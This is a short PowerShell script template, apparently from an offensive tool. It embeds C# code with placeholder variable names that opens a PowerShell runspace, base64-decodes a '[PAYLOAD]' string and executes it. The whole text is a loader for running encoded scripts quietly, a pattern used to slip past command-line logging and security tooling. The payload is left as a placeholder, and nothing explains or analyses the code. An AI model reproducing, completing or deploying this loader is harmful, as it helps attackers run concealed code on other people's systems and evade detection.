$VAR21 = @"
namespace VAR22 {
    using System;
    using System.IO;
    using System.Text;
    using System.Management.Automation;
    using System.Collections.Generic;
    using System.Collections.ObjectModel;
    using System.Management.Automation.Runspaces;
    
    public static class VAR2 { 
        public static string VAR20() {
        
            Runspace VAR4 = RunspaceFactory.CreateRunspace();
            VAR4.Open();
            RunspaceInvoke VAR5 = new RunspaceInvoke(VAR4);
            Pipeline VAR12 = VAR4.CreatePipeline();
            
            byte[] VAR10 = Convert.FromBase64String("[PAYLOAD]");
            string VAR11 = Encoding.UTF8.GetString(VAR10);
        
            VAR12.Commands.AddScript(VAR11);
            VAR12.Commands.Add("Out-String");
            Collection<PSObject> VAR13 = VAR12.Invoke();
            VAR4.Close();
            
            StringBuilder VAR14 = new StringBuilder();
            foreach(PSObject VAR15 in VAR13) {
                VAR14.AppendLine(VAR15.ToString());
            }
            return VAR14.ToString();
        }
    }
}
"@

Add-Type -TypeDefinition $VAR21 -Language CSharp
[VAR22.VAR2]::VAR20()
